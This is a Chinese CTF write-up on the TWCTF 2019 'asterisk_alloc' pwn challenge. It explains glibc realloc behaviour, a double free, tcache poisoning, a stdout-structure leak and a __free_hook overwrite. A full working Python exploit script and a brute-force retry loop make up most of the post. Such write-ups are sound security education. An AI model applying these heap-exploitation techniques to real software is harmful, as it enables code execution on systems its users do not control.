# TWCTF_online_2019_asterisk_alloc



### 总结

主要是针对`realloc`的利用，分析了一波源码，当调用`realloc(ptr, new_size)`时，利用点如下：

- 若`ptr`为`NULL`，则`return malloc(new_size)`
- 若`ptr != NULL && new_size == 0`，则调用`free(ptr);return NULL`
- 若`new_size`非法时，则`return NULL`
- 若`new_size < old_size - 0x20`，则会`chunk shrink`
- 若`new_size > old_size`，高地址处的`chunk`为`top`则直接扩展；为可`free`状态的`chunk`，则先`unlink`，再判断要不要切割；否则直接申请新的内存，拷贝后释放老的

<!-- more -->

### 漏洞点

1. `call_free`函数可以`double free`：

   ![image-20211227230250032](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211227230250032.png)

2. `call_realloc`可以利用`realloc`函数的缺陷进行利用：

   ![image-20211227230329253](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211227230329253.png)

### 利用思路

由于题目是`libc-2.27.so`，那么可以利用`tcache poisoning`，修改`next`指针，进行任意地址分配内存。题目中没有泄露内容的分支，因此需要劫持`IO_2_1_stdout_`先泄露地址，再劫持`hook`即可完成利用。

思路如下：

- 利用`realloc`分配`0xc0`的`chunk A`，而后`shrink`到`0x90`
- 利用`double free`释放`8`次`chunk  A`，这个时候在`chunk A`的`fd`留下了`libc`地址
- 利用`realloc`分配小`chunk`切割`unsorted bin chunk`，并且低`2`字节修改`fd`，使其指向`stdout`
- 利用`realloc(-1)`将`ptr_r`置为`0`
- 利用`tcache poisoning`分配到`stdout`结构体泄露地址；用同样的方法修改`__free_hook`为`system`函数地址

### Exp

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: lynne
from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

def ma(size, data="d"):
    io.sendlineafter("Your choice: ", "1")
    io.sendlineafter("Size: ", str(size))
    if size > 0:
        io.sendafter("Data: ", data)

def ca(size, data="d"):
    io.sendlineafter("Your choice: ", "2")
    io.sendlineafter("Size: ", str(size))
    if size > 0:
        io.sendafter("Data: ", data)

def rea(size, data="d"):
    io.sendlineafter("Your choice: ", "3")
    io.sendlineafter("Size: ", str(size))
    if size > 0:
        io.sendafter("Data: ", data)

def __dele(c):
    io.sendlineafter("Your choice: ", "4")
    io.sendlineafter("Which: ", c)


def dele_m():
    __dele('m')

def dele_c():
    __dele('c')

def dele_r():
    __dele('r')

"""
1. attack stdout to leak addr
2. attack hook
"""

rea(0xb0)
rea(0x80)

for i in range(0x7):
    dele_r()


rea(0) # clear

if gift.debug:
    libc_base = get_current_libcbase_addr()
    pl = p16_ex(libc_base + libc.sym['_IO_2_1_stdout_'])
else:
    pl = p16_ex(0xc760)


rea(0x10, pl)

rea(-1)

rea(0x80)


ma(0x80, flat(0xfbad1887, 0, 0, 0, "\x00"))

libc_base = recv_libc_addr(io) - 0x3ed8b0
log_libc_base_addr(libc_base)
libc.address = libc_base

dele_r()
rea(0)

rea(0x10, flat(libc.sym['__free_hook'] - 8))
rea(-1)

rea(0x10)
rea(-1)

rea(0x10, flat("/bin/sh\x00", libc.sym.system))

dele_r()

get_flag_when_get_shell(io)

io.interactive()
```

最后加个爆破脚本：

```bash
#!/bin/sh
for i in $(seq 1 10)
do
    ./exp.py re ./TWCTF_online_2019_asterisk_alloc -p 28619 --no-log
done
```



`1/16`的概率，远程打：

![image-20211227231521381](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211227231521381.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2021-12-27-twctf-online-2019-asterisk-alloc/  

